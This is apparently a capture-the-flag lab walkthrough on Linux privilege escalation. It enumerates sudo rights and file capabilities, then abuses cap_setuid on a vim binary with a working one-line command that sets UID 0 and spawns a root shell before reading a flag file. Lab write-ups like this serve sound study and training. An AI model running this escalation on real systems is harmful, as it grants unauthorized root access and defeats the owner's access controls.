# Linux Capabilities Privilege Escalation

## Step 1: User & Permission Enumeration

First, identify the current user and check available sudo permissions.

```bash
whoami
id
sudo -l
```

## Step 2: Capabilities Enumeration

Since sudo access is unavailable, search for files with special Linux capabilities. Also, locate the flag file.

```bash
getcap -r / 2>/dev/null
find / -name "flag4.txt" 2>/dev/null
```

## Step 3: Identify & Exploit Capabilities

**Finding:**

```text
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
```

**Hint:** `cap_setuid` allows a program to change its process UID. If the program can set its UID to `0`, it may obtain root privileges.

Execute Vim with the capability:

```bash
/home/karen/vim -c ':py3 import os; os.setuid(0)' -c ':!sh'
```

Check privileges:

```bash
id
```

## Step 4: Find & Read the Flag

After obtaining root privileges, locate and read the flag.

```bash
find / -name "flag4.txt" 2>/dev/null
cat /path/to/flag4.txt
```

## Technique

- **Category:** Linux Privilege Escalation
- **Method:** Linux Capabilities Abuse
- **Capability:** `cap_setuid+ep`
- **Binary:** Vim / View
- **Result:** Root Access
